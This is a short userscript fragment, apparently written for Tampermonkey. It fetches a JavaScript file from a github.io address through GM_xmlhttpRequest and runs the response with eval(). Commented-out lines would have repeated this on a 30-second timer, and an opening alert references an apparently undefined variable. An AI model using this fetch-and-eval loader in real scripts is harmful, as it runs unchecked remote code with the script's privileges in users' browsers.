alert(test)
url = "https://tmwebscript.github.io/script/script2.js"

// setInterval(async()=>{
	GM_xmlhttpRequest({
               method: "GET",
               url: url,
               onload: data=> eval(data.responseText)
             });
// }, 30*1000)
